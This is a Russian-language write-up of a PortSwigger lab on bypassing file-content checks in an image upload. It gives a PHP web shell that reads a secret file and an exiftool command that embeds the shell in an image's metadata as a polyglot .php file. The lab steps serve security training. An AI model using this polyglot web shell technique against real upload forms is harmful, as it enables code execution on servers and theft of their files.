# Remote code execution via polyglot web shell upload

## Theory

<h3>Неправильная проверка содержимого файла</h3>

Вместо того, чтобы неявно доверять Content-Type, указанному в запросе, более безопасные серверы пытаются проверить, действительно ли содержимое файла соответствует ожидаемому.

В случае функции загрузки изображения сервер может попытаться проверить определенные внутренние свойства изображения, такие как его размеры. Например, если вы попытаетесь загрузить PHP-скрипт, он вообще не будет иметь никаких размеров. Поэтому сервер может сделать вывод, что это не может быть изображение, и соответственно отклонить загрузку.

Точно так же некоторые типы файлов могут всегда содержать определенную последовательность байтов в своем заголовке или нижнем колонтитуле. Их можно использовать как отпечаток пальца или подпись, чтобы определить, соответствует ли содержимое ожидаемому типу. Например, файлы JPEG всегда начинаются с байтов FF D8 FF.

Это гораздо более надежный способ проверки типа файла, но даже он не является надежным. Используя специальные инструменты, такие как ExifTool, можно легко создать многоязычный файл JPEG, содержащий вредоносный код в своих метаданных.

## Writeup

* Имеющиеся данные: 
    * Данные нашего аккаунта: wiener:peter

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_polyglot_web_shell_upload/assets/1.png)

Логинимся c имеющимися данными. У нас есть возможность загрузки аватара пользователя. Загрузим экплоит. Мы получаем сообщение о том, что мы можем загружать только картинки.

Код эксплоита:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_polyglot_web_shell_upload/assets/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_polyglot_web_shell_upload/assets/3.png)

Воспользуемся утилитов Exiftool, чтобы вшить полезную нагрузку в картинку. Используем следующую команду:
```
exiftool -comment="<?php echo 'POINT ' . file_get_contents('/home/carlos/secret') . ' POINT'; ?>" 29072.png -o exploit2.php
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_polyglot_web_shell_upload/assets/4.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_polyglot_web_shell_upload/assets/5.png)

Загружаем эксплоит и получаем сообщение об успешной загрузке файла.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_polyglot_web_shell_upload/assets/6.png)

Обновим страницу. Перехватим необходимый запрос и получим ответ на него. Содержимое файла будет находится между двумя нашими флагами, которые мы указали ранее.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_polyglot_web_shell_upload/assets/7.png)

Подтверждаем ответ и получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Remote_code_execution_via_polyglot_web_shell_upload/assets/8.png)
